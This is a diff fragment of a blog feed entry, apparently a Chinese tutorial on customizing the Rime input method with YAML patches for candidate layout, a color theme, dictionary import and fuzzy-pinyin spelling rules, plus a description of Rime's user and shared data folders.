+<h1 id="x2F-rime-x2F-default-custom-yaml"><a href="#x2F-rime-x2F-default-custom-yaml" class="headerlink" title="&#x2F;rime&#x2F;default.custom.yaml"></a>&#x2F;rime&#x2F;default.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;menu/page_size&quot;</span>: <span class="number">7</span> <span class="comment">#每页候选词个数</span></span><br><span class="line">	<span class="string">&quot;ascii_composer/switch_key/Shift_L&quot;</span>: commit_code <span class="comment">#左shift提交字母</span></span><br><span class="line">	<span class="string">&quot;style/horizontal&quot;</span>: true      <span class="comment"># 候選橫排</span></span><br></pre></td></tr></table></figure>
+<h1 id="x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml"><a href="#x2F-ibus-x2F-rime-x2F-luna-pinyin-custom-yaml" class="headerlink" title="&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml"></a>&#x2F;ibus&#x2F;rime&#x2F;luna_pinyin.custom.yaml</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line">	switches:                   <span class="comment"># 注意縮進</span></span><br><span class="line">	- name: ascii_mode</span><br><span class="line">	reset: <span class="number">0</span>                <span class="comment"># reset 0 的作用是當從其他輸入方案切換到本方案時，</span></span><br><span class="line">	states: [ 中文, 西文 ]  <span class="comment"># 重設爲指定的狀態，而不保留在前一個方案中設定的狀態。</span></span><br><span class="line">	- name: full_shape        <span class="comment"># 選擇輸入方案後通常需要立即輸入中文，故重設 ascii_mode = 0；</span></span><br><span class="line">	states: [ 半角, 全角 ]  <span class="comment"># 而全／半角則可沿用之前方案中的用法。</span></span><br><span class="line">	- name: simplification</span><br><span class="line">	reset: <span class="number">1</span>                <span class="comment"># 增加這一行：默認啓用「繁→簡」轉換。</span></span><br><span class="line">	states: [ 漢字, 汉字 ]</span><br></pre></td></tr></table></figure>
+<h1 id="weasel-custom-yaml"><a href="#weasel-custom-yaml" class="headerlink" title="weasel.custom.yaml"></a>weasel.custom.yaml</h1><h2 id="P站配色主题风格"><a href="#P站配色主题风格" class="headerlink" title="P站配色主题风格"></a>P站配色主题风格</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">patch:</span><br><span class="line"><span class="comment"># rime输入法自定义P站配色风格主题</span></span><br><span class="line">	<span class="string">&quot;style/layout/round_corner&quot;</span>:<span class="number">5</span></span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>::p</span><br><span class="line">	  <span class="string">&quot;style/horizontal&quot;</span>: true  <span class="comment">#横向排列</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/:p&quot;</span>:</span><br><span class="line">		author:BLACK</span><br><span class="line">		name::p</span><br><span class="line">		back_color:<span class="number">0x000000</span></span><br><span class="line">		label_color:<span class="number">0xffffff</span></span><br><span class="line">		border_color:<span class="number">0x000000</span></span><br><span class="line">		text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_back_color:<span class="number">0x009bff</span></span><br><span class="line">		candidate_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_candidate_text_color:<span class="number">0x000000</span></span><br><span class="line">		hilited_candidate_back_color:<span class="number">0x009bff</span></span><br><span class="line">		comment_text_color:<span class="number">0xffffff</span></span><br><span class="line">		hilited_lable_color:<span class="number">0x000000</span></span><br></pre></td></tr></table></figure>
+<pre><code>• 输入法代号：ibus-rime
+• 用户资料夹： ~/.config/ibus/rime/
+• 共享资料夹： /usr/share/rime-data/
+</code></pre>
+<p>共享资料夹包含预设输入方案的源文件。 这些文件属于 Rime 所发行软件的一部份，在访问权限控制较严格的系统上对用户是只读的，因此谢绝软件版本更新以外的任何修改—— 一旦用户修改这里的文件，很可能影响后续的软件升级或在升级时丢失数据。<br>在「部署 Rime」操作时，将用到这里的输入方案源文件、并结合用户定制的内容来编译预设输入方案。</p>
+<h1 id="「用户资料夹」数据说明"><a href="#「用户资料夹」数据说明" class="headerlink" title="「用户资料夹」数据说明"></a>「用户资料夹」数据说明</h1><h2 id="用户资料夹则包含为用户准备的内容"><a href="#用户资料夹则包含为用户准备的内容" class="headerlink" title="用户资料夹则包含为用户准备的内容"></a>用户资料夹则包含为用户准备的内容</h2><pre><code>• 〔全局設定〕 default.yaml
+• 〔發行版設定〕 ibus-rime.yaml
+• 〔預設輸入方案副本〕 &lt;方案标识&gt;.schema.yaml ibus-rime.schema.yaml
+• ※〔安裝信息〕 installation.yaml
+• ※〔用戶狀態信息〕 user.yaml
+</code></pre>
+<h2 id="编译输入方案所产出的二进制文件："><a href="#编译输入方案所产出的二进制文件：" class="headerlink" title="编译输入方案所产出的二进制文件："></a>编译输入方案所产出的二进制文件：</h2><pre><code>• 〔Rime 棱鏡〕 &lt;方案标识&gt;.prism.bin
+• 〔Rime 固態詞典〕 &lt;词典名&gt;.table.bin
+• 〔Rime 反查詞典〕 &lt;词典名&gt;.reverse.bin
+</code></pre>
+<h2 id="记录用户写作习惯的文件"><a href="#记录用户写作习惯的文件" class="headerlink" title="记录用户写作习惯的文件"></a>记录用户写作习惯的文件</h2><pre><code>• ※〔用戶詞典〕 &lt;词典名&gt;.userdb.kct
+• ※〔用戶詞典快照〕 &lt;词典名&gt;.userdb.txt、&lt;词典名&gt;.userdb.kct.snapshot 見於同步文件夾
+</code></pre>
+<h2 id="用户自己设定的"><a href="#用户自己设定的" class="headerlink" title="用户自己设定的"></a>用户自己设定的</h2><pre><code>• ※〔用戶對全局設定的定製信息〕 default.custom.yaml
+• ※〔用戶對預設輸入方案的定製信息〕 &lt;方案标识&gt;.custom.yaml
+• ※〔用戶自製輸入方案〕及配套的詞典源文件
+</code></pre>
+<p>注：以上标有 ※ 号的文件，包含用户资料，清理文件时要注意备份！</p>
+<h1 id="词库管理"><a href="#词库管理" class="headerlink" title="词库管理"></a>词库管理</h1><ol>
+<li>导入搜狗词库：<ol>
+<li>luna_pinyinn.sogou.dict.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rime dictionary</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line">---</span><br><span class="line">name: luna_pinyin.sogou</span><br><span class="line">version: <span class="string">&quot;2015.12.24&quot;</span></span><br><span class="line">sort: by_weight</span><br><span class="line">use_preset_vocabulary: true</span><br><span class="line">import_tables:</span><br><span class="line">  - luna_pinyin</span><br><span class="line">...</span><br><span class="line"><span class="comment">#######后面为词库内容#########</span></span><br></pre></td></tr></table></figure></li>
+<li>luna_pinyin_simp.custom.yaml <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">translator/dictionary: luna_pinyin.sogou  <span class="comment">#导入搜狗词库</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<p>2.特殊字符定义：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;recognizer/patterns/punct&#x27;</span>: <span class="string">&quot;^/[a-z]*$&quot;</span>  <span class="comment">#可以使symbols中的‘/hj’‘/fh’等命令</span></span><br><span class="line"><span class="string">&#x27;punctuator/import_preset&#x27;</span>: symbols       <span class="comment">#将标点设置默认为&#x27;symbols.yaml&#x27;文件</span></span><br><span class="line"><span class="string">&quot;switches/@0/reset&quot;</span>: <span class="number">1</span>  <span class="comment"># 初始的 ascii mode 设置为「西文」</span></span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>糢糊音定义：<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;speller/algebra&#x27;</span>:</span><br><span class="line">    - erase/^xx$/                      <span class="comment"># 第一行保留</span></span><br><span class="line">    <span class="comment"># 模糊音定義</span></span><br><span class="line">    <span class="comment"># 需要哪組就刪去行首的 # 號，單雙向任選</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])h/$1/             # zh, ch, sh =&gt; z, c, s</span></span><br><span class="line">    <span class="comment">#- derive/^([zcs])([^h])/$1h$2/     # z, c, s =&gt; zh, ch, sh</span></span><br><span class="line">    <span class="comment">#- derive/^n/l/                     # n =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^l/n/                     # l =&gt; n</span></span><br><span class="line">    <span class="comment"># 這兩組一般是單向的</span></span><br><span class="line">    <span class="comment">#- derive/^r/l/                     # r =&gt; l</span></span><br><span class="line">    <span class="comment">#- derive/^ren/yin/                 # ren =&gt; yin, reng =&gt; ying</span></span><br><span class="line">    <span class="comment">#- derive/^r/y/                     # r =&gt; y</span></span><br><span class="line">    <span class="comment"># 下面 hu &lt;=&gt; f 這組寫法複雜一些，分情況討論</span></span><br><span class="line">    <span class="comment">#- derive/^hu$/fu/                  # hu =&gt; fu</span></span><br><span class="line">    - derive/^hong$/feng/              <span class="comment"># hong =&gt; feng</span></span><br><span class="line">    - derive/^hu([<span class="keyword">in</span>])$/fe$<span class="number">1</span>/          <span class="comment"># hui =&gt; fei, hun =&gt; fen</span></span><br><span class="line">    <span class="comment">#- derive/^hu([ao])/f$1/            # hua =&gt; fa, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fu$/hu/                  # fu =&gt; hu</span></span><br><span class="line">    - derive/^feng$/hong/              <span class="comment"># feng =&gt; hong</span></span><br><span class="line">    <span class="comment">#- derive/^fe([in])$/hu$1/          # fei =&gt; hui, fen =&gt; hun</span></span><br><span class="line">    <span class="comment">#- derive/^f([ao])/hu$1/            # fa =&gt; hua, ...</span></span><br><span class="line">    <span class="comment"># 韻母部份</span></span><br><span class="line">    <span class="comment">#- derive/^([bpmf])eng$/$1ong/      # meng = mong, ...</span></span><br><span class="line">    - derive/([ei])n$/$1ng/            <span class="comment"># en =&gt; eng, in =&gt; ing</span></span><br><span class="line">    - derive/([ei])ng$/$1n/            <span class="comment"># eng =&gt; en, ing =&gt; in</span></span><br><span class="line">    - derive/^un/iong/                 <span class="comment"># un =&gt; iong</span></span><br><span class="line">    - derive/^iong/un/                 <span class="comment"># iong =&gt; un</span></span><br><span class="line">    <span class="comment"># 樣例足夠了，其他請自己總結……</span></span><br><span class="line">    <span class="comment"># 反模糊音？</span></span><br><span class="line">    <span class="comment"># 誰說方言沒有普通話精確、有模糊音，就能有反模糊音。</span></span><br><span class="line">    <span class="comment"># 示例爲分尖團的中原官話：</span></span><br><span class="line">    <span class="comment">#- derive/^ji$/zii/   # 在設計者安排下鳩佔鵲巢，尖音i只好雙寫了</span></span><br><span class="line">    <span class="comment">#- derive/^qi$/cii/</span></span><br><span class="line">    <span class="comment">#- derive/^xi$/sii/</span></span><br><span class="line">    <span class="comment">#- derive/^ji/zi/</span></span><br><span class="line">    <span class="comment">#- derive/^qi/ci/</span></span><br><span class="line">    <span class="comment">#- derive/^xi/si/</span></span><br><span class="line">    <span class="comment">#- derive/^ju/zv/</span></span><br><span class="line">    <span class="comment">#- derive/^qu/cv/</span></span><br><span class="line">    <span class="comment">#- derive/^xu/sv/</span></span><br><span class="line">    <span class="comment"># 韻母部份，只能從大面上覆蓋</span></span><br><span class="line">    <span class="comment">#- derive/^([bpm])o$/$1eh/          # bo =&gt; beh, ...</span></span><br><span class="line">    <span class="comment">#- derive/(^|[dtnlgkhzcs]h?)e$/$1eh/  # ge =&gt; geh, se =&gt; sheh, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])uo$/$1ue/         # guo =&gt; gue, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([gkh])e$/$1uo/          # he =&gt; huo, ...</span></span><br><span class="line">    <span class="comment">#- derive/([uv])e$/$1o/             # jue =&gt; juo, lve =&gt; lvo, ...</span></span><br><span class="line">    <span class="comment">#- derive/^fei$/fi/                 # fei =&gt; fi</span></span><br><span class="line">    <span class="comment">#- derive/^wei$/vi/                 # wei =&gt; vi</span></span><br><span class="line">    <span class="comment">#- derive/^([nl])ei$/$1ui/          # nei =&gt; nui, lei =&gt; lui</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])un$/$1vn/       # lun =&gt; lvn, zun =&gt; zvn, ...</span></span><br><span class="line">    <span class="comment">#- derive/^([nlzcs])ong$/$1iong/    # long =&gt; liong, song =&gt; siong, ...</span></span><br><span class="line">    <span class="comment"># 這個辦法雖從拼寫上做出了區分，然而受詞典制約，候選字仍是混的。</span></span><br><span class="line">    <span class="comment"># 只有真正的方音輸入方案纔能做到！但「反模糊音」這個玩法快速而有效！</span></span><br><span class="line">    <span class="comment"># 模糊音定義先於簡拼定義，方可令簡拼支持以上模糊音</span></span><br><span class="line">    - abbrev/^([a-z]).+$/$<span class="number">1</span>/           <span class="comment"># 簡拼（首字母）</span></span><br><span class="line">    - abbrev/^([zcs]h).+$/$<span class="number">1</span>/          <span class="comment"># 簡拼（zh, ch, sh）</span></span><br><span class="line">    <span class="comment"># 以下是一組容錯拼寫，《漢語拼音》方案以前者爲正</span></span><br><span class="line">    - derive/^([nl])ve$/$1ue/          <span class="comment"># nve = nue, lve = lue</span></span><br><span class="line">    - derive/^([jqxy])u/$1v/           <span class="comment"># ju = jv,</span></span><br><span class="line">    - derive/un$/uen/                  <span class="comment"># gun = guen,</span></span><br><span class="line">    - derive/ui$/uei/                  <span class="comment"># gui = guei,</span></span><br><span class="line">    - derive/iu$/iou/                  <span class="comment"># jiu = jiou,</span></span><br><span class="line">    <span class="comment"># 自動糾正一些常見的按鍵錯誤</span></span><br><span class="line">    - derive/([aeiou])ng$/$1gn/        <span class="comment"># dagn =&gt; dang</span></span><br><span class="line">    - derive/([dtngkhrzcs])o(u|ng)$/$1o/  <span class="comment"># zho =&gt; zhong|zhou</span></span><br><span class="line">    - derive/ong$/on/                  <span class="comment"># zhonguo =&gt; zhong guo</span></span><br><span class="line">    - derive/ao$/oa/                   <span class="comment"># hoa =&gt; hao</span></span><br><span class="line">    - derive/([iu])a(o|ng?)$/a$<span class="number">1</span>$<span class="number">2</span>/    <span class="comment"># tain =&gt; tian</span></span><br><span class="line">  <span class="comment"># 分尖團後 v =&gt; ü 的改寫條件也要相應地擴充：</span></span><br><span class="line">  <span class="comment">#&#x27;translator/preedit_format&#x27;:</span></span><br><span class="line">  <span class="comment">#  - &quot;xform/([nljqxyzcs])v/$1ü/&quot;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+        <tag>open source</tag>
       </tags>
   </entry>
   <entry>
